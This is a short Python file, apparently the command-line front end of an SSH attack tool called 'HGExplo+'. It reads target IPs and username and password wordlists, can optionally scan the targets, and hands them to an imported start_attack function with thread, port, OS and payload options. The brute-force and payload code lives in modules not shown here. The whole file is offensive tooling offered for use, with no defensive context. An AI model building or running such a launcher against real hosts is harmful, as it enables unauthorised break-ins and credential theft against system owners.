# cli/main.py

import sys
import os

# Add root project directory to the Python path
sys.path.append(r"C:\Users\Mishika joshi\Music\HGExploPlus")

import argparse
from core.ssh_engine import start_attack
from core.scanner import scan_targets
from utils.session import load_wordlists

parser = argparse.ArgumentParser(description="HGExplo+ CLI")
parser.add_argument('--targets', required=True)
parser.add_argument('--userlist', required=True)
parser.add_argument('--passlist', required=True)
parser.add_argument('--threads', type=int, default=5)
parser.add_argument('--port', type=int, default=22)
parser.add_argument('--payload', action='store_true')
parser.add_argument('--scan', action='store_true')
parser.add_argument('--os', choices=['linux', 'windows'], default='linux')

args = parser.parse_args()

with open(args.targets) as f:
    ip_list = [line.strip() for line in f]

if args.scan:
    print("[*] Scanning targets...")
    scanned = scan_targets(ip_list, args.port)
    ip_list = [ip for ip, _ in scanned]

user_list = load_wordlists(args.userlist)
pass_list = load_wordlists(args.passlist)

start_attack(ip_list, user_list, pass_list, args.port, args.threads, args.os, args.payload)
